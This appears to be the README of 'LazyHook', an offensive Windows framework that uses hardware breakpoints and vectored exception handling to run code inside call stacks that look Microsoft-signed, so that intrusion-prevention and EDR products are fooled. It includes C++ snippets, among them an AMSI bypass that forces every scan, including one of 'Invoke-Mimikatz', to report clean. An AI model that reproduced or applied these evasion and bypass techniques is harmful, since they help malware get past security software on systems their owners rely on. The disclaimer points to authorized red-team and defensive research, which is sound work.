## Overview

LazyHook is a stealthy API hooking framework that **bypasses Host Intrusion Prevention Systems (HIPS)** through call stack spoofing. By leveraging CPU-level hardware breakpoints and Vectored Exception Handling, it executes arbitrary code as if it originated from trusted, Microsoft-signed modules—completely fooling behavioral analysis engines that rely on call stack inspection and module origin verification.

> **Evade behavioral analysis by executing malicious code within trusted Microsoft call stacks**  
> Uses hardware breakpoints + VEH to hijack legitimate functions and spoof module origins

### The Problem: Modern Security Software

Host Intrusion Prevention Systems (HIPS) and behavioral analysis engines monitor applications by:
- **Call Stack Analysis**: Tracking the origin and flow of API calls
- **Module Origin Verification**: Checking if suspicious behavior originates from trusted modules
- **API Pattern Recognition**: Detecting malicious sequences (e.g., VirtualAlloc → WriteProcessMemory → CreateRemoteThread)
- **Return Address Validation**: Ensuring return addresses point to legitimate code sections

Systems like Kaspersky System Watcher, Windows Defender, Cylance, and CrowdStrike all employ variations of these techniques.

### The Solution: Trusted Call Stack Spoofing

By hijacking a function in a **Microsoft-signed assembly** (e.g., `System.Windows.Forms.dll`, `user32.dll`), we can execute arbitrary logic within a call stack that appears completely legitimate.
Note: It's possible to do an JmpHook, which will hook MsgBox -> and just after call it to your custom code. LazyHook doesn't do that

**Why This Works:**
1. The hooked function is in a trusted, digitally-signed Microsoft DLL
2. When your payload executes, the call stack shows the trusted module as the caller
4. The hardware breakpoint leaves no memory modifications, so integrity checks pass

The security software sees the second scenario and thinks: *"MessageBoxA from user32.dll is calling Windows APIs? That's normal behavior."*

### How It Works

```
┌─────────────────────────────────────────────────────────┐
│  1. Target Function Call                                │
│     ↓                                                    │
│  2. CPU Debug Register Triggers (DR0-DR3)               │
│     ↓                                                    │
│  3. EXCEPTION_SINGLE_STEP Raised                        │
│     ↓                                                    │
│  4. VEH Handler Intercepts Exception                    │
│     ↓                                                    │
│  5. Execution Redirected to Hook Function               │
│     ↓                                                    │
│  6. CallOriginal() Temporarily Disables Breakpoint      │
│     ↓                                                    │
│  7. Original Function Executes                          │
│     ↓                                                    │
│  8. Breakpoint Re-enabled                               │
└─────────────────────────────────────────────────────────┘
```

### Hook Types

#### IAT (Import Address Table) Hooking
Intercepts imported functions by locating their address in the IAT and setting a hardware breakpoint. This hooks the specific import in your process.

```cpp
HookIAT("user32.dll", "MessageBoxA", HookFunction, &OriginalFunction);
```

#### EAT (Export Address Table) Hooking
Hooks exported functions globally from a DLL by resolving their address via the export table. This affects all calls to that export.

```cpp
HookEAT("amsi.dll", "AmsiScanBuffer", HookFunction, &OriginalFunction);
```

## Entry.cpp Demonstration

The included demo showcases three practical scenarios:

### 1. MessageBoxA IAT Hook
Demonstrates IAT hooking by intercepting `MessageBoxA` calls and modifying the displayed message:
```cpp
int WINAPI HookMessageBoxA(HWND H, LPCSTR T, LPCSTR C, UINT U)
{
    printf("[*] MessageBoxA hooked!\n");
    return LazyHook::CallOriginal<int>(LazyHook::GetIatState(), H, "Hooked!", ">:)", U);
}
```

### 2. CreateFileA EAT Hook (Commented Example)
Shows how to monitor file operations by logging `CreateFileA` calls:
```cpp
HANDLE WINAPI HookCreateFileA(LPCSTR Filename, ...)
{
    printf("[*] CreateFileA hooked: %s\n", Filename);
    return LazyHook::CallOriginal<HANDLE>(...);
}
```

### 3. AMSI Bypass via AmsiScanBuffer Hook
Demonstrates security software bypass by forcing all AMSI scans to return clean results:
```cpp
HRESULT WINAPI HookAmsiScanBuffer(...)
{
    printf("[*] AmsiScanBuffer hooked! Bypassing...\n");
    HRESULT OrgResult = LazyHook::CallOriginal<HRESULT>(...);
    (*Result) = AMSI_RESULT_CLEAN;  // Force clean regardless of content
    return OrgResult;
}
```

The demo tests the AMSI bypass by scanning `"Invoke-Mimikatz"` (a known malicious string) and shows it being classified as clean.

## Implementation Details

### Debug Register Configuration

```
DR7 Layout (Simplified):
- Bits 0,2,4,6: Enable flags for DR0-DR3 (Local Enable)
- Bits 16-31: Breakpoint conditions (Execute, Write, IO, R/W)
```

The framework configures DR7 to:
- Enable execution breakpoints (00b for execute condition)
- Set 1-byte length for breakpoint precision

### Vectored Exception Handling

The VEH handler:
1. Checks if exception is `EXCEPTION_SINGLE_STEP`
2. Compares instruction pointer (RIP/EIP) against registered hooks
3. Redirects execution to hook function if match found
4. Returns `EXCEPTION_CONTINUE_EXECUTION` to resume at hook

### CallOriginal Pattern

```cpp
template<typename Ret, typename... Args>
Ret CallOriginal(VehHookState* State, Args... args)
{
    RemoveHardwareBreakpoint(State->DrIndex);  // Disable temporarily
    Ret Result = ((FuncType)State->OriginalFunction)(args...);
    SetHardwareBreakpoint(State->OriginalFunction, State->DrIndex);  // Re-enable
    return Result;
}
```

## Example Use Cases

### 1. AMSI Bypass

The demo shows hooking `AmsiScanBuffer` to force clean scan results:

```cpp
HRESULT WINAPI HookAmsiScanBuffer(...)
{
    HRESULT Result = LazyHook::CallOriginal<HRESULT>(...);
    (*Result) = AMSI_RESULT_CLEAN;  // Force clean result
    return Result;
}
```

This demonstrates how security software behavior can be modified at runtime by intercepting critical API calls.

### 2. Function Call Monitoring

Hook `CreateFileA` to log file access without modifying application behavior:

```cpp
HANDLE WINAPI HookCreateFileA(LPCSTR Filename, ...)
{
    printf("File accessed: %s\n", Filename);
    return LazyHook::CallOriginal<HANDLE>(...);
}
```

## Responsible Use & Legal Notice

This code demonstrates advanced evasion techniques for:
- **Security research and education**
- **Red team operations in authorized environments**
- **Malware analysis and defensive research**

**⚠️ Warning**: Unauthorized use to bypass security controls, modify software behavior, or circumvent protections may violate computer fraud laws (CFAA, GDPR, equivalent legislation). This framework is provided for **educational and authorized security research only**.

---

**Understanding offensive techniques builds better defenses.**
